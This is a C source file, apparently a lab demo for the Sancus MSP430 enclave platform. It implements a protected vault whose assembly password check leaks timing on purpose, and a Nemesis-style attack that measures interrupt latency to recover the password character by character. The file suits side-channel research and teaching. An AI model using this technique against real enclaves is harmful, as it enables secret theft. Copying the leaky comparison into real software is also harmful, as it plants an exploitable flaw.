#include <sancus_support/sm_io.h>
#include <sancus_support/timer.h>
#include <sancus/sm_support.h>
#include <string.h>
#include <msp430.h>

#define CAT(x) #x
#define BUF_LEN 128
void nemesis(void);
void exit_success(void);
void timerA_isr(void);


/* ======== VAULT WORLD SM ======== */

DECLARE_SM(vault, 0x1234);
#define VAULT_SECRET_CST    0xbeef
#define VAULT_PW_C1         'c'
#define VAULT_PW_C2         'a'
#define VAULT_PW_C3         'f'
#define VAULT_PW_C4         'e'
#define VAULT_PW_C5         '\0'
#define VAULT_PASSWD        "cafe"
#define VAULT_PASSWD_LEN    5 //8+1 for null byte

int SM_DATA(vault) vault_initialized;
int SM_DATA(vault) vault_secret;
char SM_DATA(vault) vault_passwd[VAULT_PASSWD_LEN];
int const SM_DATA(vault) vault_secret_const = VAULT_SECRET_CST;
char const SM_DATA(vault) vault_passwd_const1 = VAULT_PW_C1;
char const SM_DATA(vault) vault_passwd_const2 = VAULT_PW_C2;
char const SM_DATA(vault) vault_passwd_const3 = VAULT_PW_C3;
char const SM_DATA(vault) vault_passwd_const4 = VAULT_PW_C4;
char const SM_DATA(vault) vault_passwd_const5 = VAULT_PW_C5;

void SM_ENTRY(vault) vault_init()
{
    if (!vault_initialized)
    {
        // copy the constant chars into the buffer for the passwd
        __asm__ __volatile__(   "push r4                        \n\t"
                                "push r5                        \n\t"
                                "mov #vault_passwd, r5          \n\t"
                                "mov #vault_passwd_const1, r4   \n\t"
                                "mov.b @(r4), @(r5)             \n\t"
                                "add #1, r5                     \n\t"
                                "mov #vault_passwd_const2, r4   \n\t"
                                "mov.b @(r4), @(r5)             \n\t"
                                "add #1, r5                     \n\t"
                                "mov #vault_passwd_const3, r4   \n\t"
                                "mov.b @(r4), @(r5)             \n\t"
                                "add #1, r5                     \n\t"
                                "mov #vault_passwd_const4, r4   \n\t"
                                "mov.b @(r4), @(r5)             \n\t"
                                "add #1, r5                     \n\t"
                                "mov #vault_passwd_const5, r4   \n\t"
                                "mov.b @(r4), @(r5)             \n\t"
                                "pop r5                         \n\t"
                                "pop r4                         \n\t"
                                );
        vault_secret = vault_secret_const;
        vault_initialized = 1;
    }
}

/**
 * Returns 0 on failure, and the secret on success
 * Contains a nemesis style timing sidechannel
 * */
int SM_ENTRY(vault) get_secret(char* provided_passwd)
{
    int len = VAULT_PASSWD_LEN;
    int rv, success = 0;
    
    /*
     * Provided password must match password exactly, including the nullbyte at the end
     * This prevents provided password from being accepted if it starts with passwd
     */
    /*
    for (int i = 0; i < len; i++)
    {
        if (provided_passwd[i] != vault_passwd[i])
            success = 0xfedc;
        else
            __asm__("nop\n\t"); // prevent sidechannel timing attack
    }
    if (!success)
    {
        rv = vault_secret;
    }
    else
    {
        rv = 0;
    }
    */
    /*
     * 
     * r7 = success
     * r8 = provided_passwd[i]
     * index in r9
     * r10 = vault_passwd[i]
     * rv in %0
     * addr to provdided_passwd in %1
     * len in %2
     * 
     */
    __asm__ __volatile__(   "mov #0x0, r7; success = 0      \n\t"
                            "mov #0x0, r9; i = 0            \n\t"
                            "beginLp: cmp r9, %2            \n\t"
                            "jeq endLp                      \n\t"
                            "mov %1, r8                     \n\t"
                            "add r9, r8                     \n\t"
                            "mov r9, r10                    \n\t"
                            "add #vault_passwd, r10         \n\t"
                            "cmp.b @(r8), @(r10)            \n\t"
                            "jeq eqLp                       \n\t"
                            "bis #0x1, r7                   \n\t"
                            "jmp epilogueLp                 \n\t"
                            "eqLp: nop                      \n\t"
                            "nop                            \n\t"
                            "nop                            \n\t"
                            "nop                            \n\t"
                            "epilogueLp: inc r9 ; i++       \n\t"
                            "jmp beginLp ; goto begin       \n\t"
                            "endLp: tst r7; success ?= 0    \n\t"
                            "jz ok                          \n\t"
                            "mov #0x0, %0 ; rv = 0          \n\t"
                            "jmp end3                       \n\t"
                            "ok: mov &vault_secret, %0;     \n\t"
                            "end3: nop                      \n\t"
                            : "=r" (rv)
                            : "r" (provided_passwd), "r" (len)
                            : "r7", "r8", "r9", "r10", "r11");
    
    /*
    
    */
    return rv;
}

void SM_ENTRY(vault) vault_disable(void)
{
    sancus_disable(exit_success);
}

/* ======== UNTRUSTED CONTEXT ======== */

volatile int latency;
char current[BUF_LEN] = {0};

int main(void)
{
    // necessary init
    msp430_io_init();
    __asm__ __volatile__("eint\n\t");
    
    // enable sm
    sancus_enable(&vault);
    vault_init();
    
    ASSERT(get_secret(VAULT_PASSWD) == VAULT_SECRET_CST);
    // leak different func
    nemesis();
    
    vault_disable();
    
}

void nemesis(void)
{
    /*
     * Holds our current guess
     * Assume all passwords are less than BUF_LEN chars
     */
    // tracks length of current guess without null byte
    char current_len = 0;
    
    // repeatedly bruteforce one char at a time for timing channel 1
    while (!get_secret(current) && current_len < 10)
    {
        int valid = 0;
        char bestChar = '\0';
        unsigned int bestTime = 0xfedc;
        for (char c = 'a'; c <= 'g'; c++)
        {
            current[current_len] = c;
            timer_irq(0x90+current_len*(22)); // YEY FOR MAGIC NUMBERS
            volatile int v = get_secret(current);
            if (!valid || latency < bestTime)
            {
                bestTime = latency;
                bestChar = c;
                valid = 1;
            }
        }
        printf("Best char: 0x%.2x\n", bestChar);
        // write best char into buf and continue with next char
        current[current_len] = bestChar;
        current_len++;
        //printf("Current: %s\n", current);
    }
    printf("Recovered passwd: %s\n", current);
}

void exit_success(void)
{
    //pr_info("SM disabled; all done!");
    EXIT();
}

/* =========================== TIMER A ISR =============================== */

void timerA_isr(void)
{
    timer_disable();
}


/*
 * NOTE: we use a naked asm function here to be able to store IRQ latency.
 * (Timer_A continues counting from zero after IRQ generation)
 */
__attribute__((naked)) __attribute__((interrupt(TIMER_IRQ_VECTOR)))
void timerA_isr_entry(void)
{
    asm("mov %0, &latency           \n\t"
        "mov &__unprotected_sp, r1  \n\t"
        "call #timerA_isr           \n\t"
        "br r15                     \n\t"
        ::"m"(TAR):);
}
